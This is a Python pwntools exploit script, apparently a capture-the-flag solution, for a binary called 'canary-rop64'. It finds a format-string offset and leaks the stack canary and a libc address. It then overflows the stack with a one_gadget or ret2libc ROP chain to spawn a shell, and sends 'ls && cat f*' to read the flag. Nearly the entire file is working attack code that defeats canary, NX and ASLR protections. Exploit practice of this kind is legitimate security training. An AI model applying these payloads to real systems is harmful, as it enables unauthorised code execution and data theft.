from pwn import *
import sys

#referensi dari : https://www.ret2rop.com/2018/08/format-string-defeating-stack-canary-nx-aslr-remote.html

def offset_finder():
    for x in range (1, 100):
        p = process("./canary-rop64")
        
        print "Offset number {}".format(x)

        payload = ""
        payload += "A" * 8
        payload += "%{}$p".format(x)

        p.sendline(payload)
        
        p.recvuntil("AAAAAAAA")
        stack_value = p.recvline()
        
        if stack_value.find("41414141") != -1:
            print "Offset found!"
            print "Stack value: {}".format(stack_value)
            break
        else:
            print "Stack value: {}".format(stack_value)
           
        p.close()

def one_gadget(target,libc, gadget_diff, libc_offset):
    binary = ELF('./canary-rop64')
    
    payload = ''
    payload += '%lx ' * 25
    p.sendlineafter('Hacker!\n', payload)
    leaked = p.recv().split(' ')[:-1]
    canary_leak = int(leaked[-5], 16)
    log.info("Canary leak : 0x{0:x}".format(canary_leak))
    
    libc_start_main_ret = int(leaked[-1], 16)
    log.info("Libc_start_main_ret : 0x{0:x}".format(libc_start_main_ret))
    base_libc = libc_start_main_ret - libc_offset
    
    log.info("Base libc : 0x{0:x}".format(base_libc))
    one_gadget_addr = base_libc + gadget_diff # kalo local gadgetnya 0x45216
    log.info("One gadget addr: {}".format(hex(one_gadget_addr)))

    payload += 'A' * 4 # 20 if 21
    payload += p64(canary_leak)
    payload += 'A' * 8
    payload += p64(one_gadget_addr)
    #gdb.attach(p,'''
    #            b *vuln+86
    #            c
    #            ''')
    p.sendline(payload)
    sleep(1)
    p.sendline('ls && cat f*')
    p.interactive()
    #code = 'A' * 104 + canary(8) + 'A' * 8 + return_address(8)

def ret2libc(p, libc, libc_offset):
    binary = ELF('./canary-rop64')

    payload = ''
    payload += '%lx ' * 25
    p.sendlineafter('Hacker!\n', payload)
    leaked = p.recv().split(' ')[:-1]
    canary_leak = int(leaked[-5], 16)
    log.info("Canary leak : 0x{0:x}".format(canary_leak))
    
    libc_start_main_ret = int(leaked[-1], 16)
    log.info("Libc_start_main_ret : 0x{0:x}".format(libc_start_main_ret))
    base_libc = libc_start_main_ret - libc_offset
    log.info("Base libc : 0x{0:x}".format(base_libc))
    libc_system = base_libc + libc.symbols["system"]
    log.info("Libc system : 0x{0:x}".format(libc_system))
    libc_binsh = base_libc + libc.search("/bin/sh").next()
    log.info("Libc /bin/sh : 0x{0:x}".format(libc_binsh))
    pop_rdi = 0x4012c3

    payload += 'A' * 4 # 20 if 21
    payload += p64(canary_leak)
    payload += 'A' * 8
    payload += p64(pop_rdi)
    payload += p64(libc_binsh)
    payload += p64(libc_system)
    #gdb.attach(p,'''
    #            b *vuln+86
    #            c
    #            ''')
    p.sendline(payload)
    sleep(1)
    p.sendline('ls && cat f*')
    p.interactive()
    #code = 'A' * 104 + canary(8) + 'A' * 8 + return_address(8)

if __name__ == "__main__":
    if len(sys.argv) < 3:
        log.info("Argument needed!")
        log.info("Usage: python {} <local/remote> <one_gadget/ret2libc>".format(sys.argv[0]))
        sys.exit(0)
    elif sys.argv[1] == "local":
        if sys.argv[2] == "one_gadget":
            p = process("./canary-rop64")
            libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so', checksec = False)
            one_gadget(p, libc, 0x4f2c5, 0x021b97)
        elif sys.argv[2] == "ret2libc":
            p = process("./canary-rop64")
            libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so', checksec = False)
            ret2libc(p, libc, 0x20830)
    elif sys.argv[1] == "remote":
        if sys.argv[2] == "one_gadget":
            p = remote("127.0.0.1", 1337)
            libc = ELF('libc6_2.27-3ubuntu1_amd64.so', checksec = False)
            one_gadget(p, libc, 0x4f2c5, 0x21b97)
        else:
            log.info("Can only use one_gadget in remote server")
    else:
        sys.exit(0)